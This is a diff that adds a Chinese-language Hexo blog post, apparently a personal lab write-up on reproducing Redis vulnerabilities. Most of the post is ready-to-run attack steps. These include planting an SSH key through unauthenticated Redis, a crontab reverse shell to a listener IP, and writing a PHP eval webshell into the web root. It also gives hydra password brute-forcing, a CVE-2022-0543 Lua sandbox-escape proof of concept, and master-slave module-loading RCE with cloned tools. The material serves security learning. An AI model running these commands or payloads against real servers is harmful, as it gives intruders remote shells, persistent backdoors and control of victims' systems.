@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"apsry.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="redis漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis漏洞复现">
+<meta property="og:url" content="https://apsry.github.io/2022/03/10/redis%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="apsry">
+<meta property="og:description" content="redis漏洞复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232307518.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232225046.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232252166.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232233964.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232237280.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232238374.png">
+<meta property="article:published_time" content="2022-03-10T12:26:00.000Z">
+<meta property="article:modified_time" content="2022-03-26T14:42:12.453Z">
+<meta property="article:author" content="apsry">
+<meta property="article:tag" content="web渗透">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232307518.png">
+
+<link rel="canonical" href="https://apsry.github.io/2022/03/10/redis%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>redis漏洞复现 | apsry</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+<!-- 引入目录截取js -->
+<script type="text/javascript" src="/js/src/abstract.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">apsry</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://apsry.github.io/2022/03/10/redis%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="apsry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="apsry">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          redis漏洞复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-10 20:26:00" itemprop="dateCreated datePublished" datetime="2022-03-10T20:26:00+08:00">2022-03-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-26 22:42:12" itemprop="dateModified" datetime="2022-03-26T22:42:12+08:00">2022-03-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>redis漏洞复现</p>
+<span id="more"></span>
+
+
+
+
+
+<p>单纯漏洞复现，原理后面再了解了0.0</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/guxiaoguo/article/details/78913245">https://blog.csdn.net/guxiaoguo/article/details/78913245</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/46467265">https://zhuanlan.zhihu.com/p/46467265</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/beichenyyds/article/details/123256319">https://blog.csdn.net/beichenyyds/article/details/123256319</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/YouthBelief/article/details/121020672">https://blog.csdn.net/YouthBelief/article/details/121020672</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232307518.png" alt="image-20200904163216140"></p>
+<h1 id="redis未授权"><a href="#redis未授权" class="headerlink" title="redis未授权"></a>redis未授权</h1><p>　Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。　　目前比较主流的案例：yam2 minerd 挖矿程序，还有在多次应急事件中发现大量的watch-smartd挖矿木马</p>
+<h3 id="写公钥"><a href="#写公钥" class="headerlink" title="写公钥"></a>写公钥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /root/.ssh/key.txt | ./redis-cli -h 192.168.10.153 -x <span class="built_in">set</span> xxx</span><br><span class="line"></span><br><span class="line">./redis-cli -h 192.168.10.153</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh</span><br><span class="line"> </span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">这时候用ssh不用密码远程连接：</span><br><span class="line">ssh 192.168.10.153</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="在crontab里写定时任务，反弹shell"><a href="#在crontab里写定时任务，反弹shell" class="headerlink" title="在crontab里写定时任务，反弹shell"></a>在crontab里写定时任务，反弹shell</h3><p>　　原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名。</p>
+<ul>
+<li>首先在客户端这边监听一个端口（随便一个端口就好，不要冲突就好）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 4444</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>连接redis，写入反弹shell</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.<span class="operator">/</span>redis<span class="operator">-</span>cli <span class="operator">-</span>h <span class="number">192.168</span><span class="number">.152</span><span class="number">.128</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.152.129/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config <span class="keyword">set</span> dir <span class="operator">/</span>var<span class="operator">/</span>spool<span class="operator">/</span>cron</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config <span class="keyword">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="在web目录下写入webshell"><a href="#在web目录下写入webshell" class="headerlink" title="在web目录下写入webshell"></a>在web目录下写入webshell</h3><p>　　通过redis在指定的web目录下写入一句话木马，用菜刀连接可达到控制服务器的目的。</p>
+<ul>
+<li>远程连接redis，写入webshell</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.152.128</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config set dir /var/www/html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set xxx &quot;\n\n\n&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;\n\n\n&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config set dbfilename webshell.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="利用redis执行命令"><a href="#利用redis执行命令" class="headerlink" title="利用redis执行命令"></a>利用redis执行命令</h3><p>　　redis 2.6以前的版本内置了lua脚本环境，在有连接redis服务器的权限下，可以利用lua执行系统命令。</p>
+<ul>
+<li>本地建立一个lua脚本</li>
+</ul>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim  hello.lua</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> msg = <span class="string">&quot;hello,hack!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在客户端连接redis服务器并执行hello.lua</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(cat hello.lua)</span>&quot;</span> 0 -h 192.168.152.128</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="利用hydra暴力破解redis的密码"><a href="#利用hydra暴力破解redis的密码" class="headerlink" title="利用hydra暴力破解redis的密码"></a>利用hydra暴力破解redis的密码</h3><p>　　使用hydra工具可以对redis进行暴力破解</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -P passwd.<span class="property">txt</span> <span class="attr">redis</span>:<span class="comment">//192.168.152.128</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Redis-Lua沙盒绕过-命令执行（CVE-2022-0543）"><a href="#Redis-Lua沙盒绕过-命令执行（CVE-2022-0543）" class="headerlink" title="Redis Lua沙盒绕过 命令执行（CVE-2022-0543）"></a>Redis Lua沙盒绕过 命令执行（CVE-2022-0543）</h1><p>Redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。 Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。 我们借助Lua沙箱中遗留的变量package的loadlib函数来加载动态链接库&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0里的导出函数luaopen_io。在Lua中执行这个导出函数，即可获得io库，再使用其执行命令</p>
+<p>poc</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> &#x27;<span class="built_in">local</span> io_l = package.loadlib(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>); <span class="built_in">local</span> io = io_l(); <span class="built_in">local</span> f = io.popen(<span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;r&quot;</span>); <span class="built_in">local</span> res = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>); f:<span class="built_in">close</span>(); <span class="built_in">return</span> res&#x27; <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232225046.png" alt="image-20220323222556992"></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">影响版本</span><br><span class="line"><span class="symbol">An</span> unexpected Redis sandbox escape affecting only Debian, Ubuntu, <span class="keyword">and</span> other derivatives</span><br><span class="line"><span class="symbol">Redis</span> &gt;<span class="number">=2</span>.<span class="number">2</span> <span class="keyword">and</span> &lt; <span class="number">5</span>.<span class="number">0</span>.<span class="number">13</span></span><br><span class="line"><span class="symbol">Redis</span> &gt;<span class="number">=2</span>.<span class="number">2</span> <span class="keyword">and</span> &lt; <span class="number">6</span>.<span class="number">0</span>.<span class="number">15</span></span><br><span class="line"><span class="symbol">Redis</span> &gt;<span class="number">=2</span>.<span class="number">2</span> <span class="keyword">and</span> &lt; <span class="number">6</span>.<span class="number">2</span>.<span class="number">5</span></span><br><span class="line">安全版本Redis <span class="number">6</span>.<span class="number">2</span>.<span class="number">5</span>、<span class="number">6</span>.<span class="number">0</span>.<span class="number">15</span>、<span class="number">5</span>.<span class="number">0</span>.<span class="number">13</span>或更高版本</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Redis未授权漏洞（CNVD-2019-21763）"><a href="#Redis未授权漏洞（CNVD-2019-21763）" class="headerlink" title="Redis未授权漏洞（CNVD-2019-21763）"></a>Redis未授权漏洞（CNVD-2019-21763）</h1><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 由于在Reids 4.x及以上版本中新增了模块功能，攻击者可通过外部拓展，在Redis中实现一个新的Redis命令。攻击者可以利用该功能引入模块，在未授权访问的情况下使被攻击服务器加载恶意.so 文件，从而实现远程代码执行。</p>
+<h4 id="redis主从复制-一种攻击方式"><a href="#redis主从复制-一种攻击方式" class="headerlink" title="redis主从复制(一种攻击方式)"></a>redis主从复制(一种攻击方式)</h4><p>redis主从RCE打多了会出现redis瘫痪的情况，所以不到万不得已，尽量不要打主从，把攻击机作为主机</p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232252166.png" alt="image-20220323225235079"></p>
+<p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。</p>
+<p>然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/n0b0dyCN/</span>RedisModules-ExecuteCommand</span><br><span class="line">cd RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">把module.so复制过去</span><br><span class="line"></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Ridter/</span>redis-rce.git</span><br><span class="line">cd redis-rce/</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232233964.png" alt="image-20220323223319823"></p>
+<p>help</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232237280.png" alt="image-20220323223714159"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203232238374.png" alt="image-20220323223856191"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag"># web渗透</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/04/OWASP-TOP10/" rel="prev" title="owasp top10">
+      <i class="fa fa-chevron-left"></i> owasp top10
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0/" rel="next" title="内网笔记">
+      内网笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="nav-text">redis未授权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%85%AC%E9%92%A5"><span class="nav-text">写公钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8crontab%E9%87%8C%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%EF%BC%8C%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">在crontab里写定时任务，反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8web%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%86%99%E5%85%A5webshell"><span class="nav-text">在web目录下写入webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8redis%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">利用redis执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8hydra%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3redis%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-text">利用hydra暴力破解redis的密码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Redis-Lua%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2022-0543%EF%BC%89"><span class="nav-text">Redis Lua沙盒绕过 命令执行（CVE-2022-0543）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2019-21763%EF%BC%89"><span class="nav-text">Redis未授权漏洞（CNVD-2019-21763）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-%E4%B8%80%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-text">redis主从复制(一种攻击方式)</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">apsry</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">apsry</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
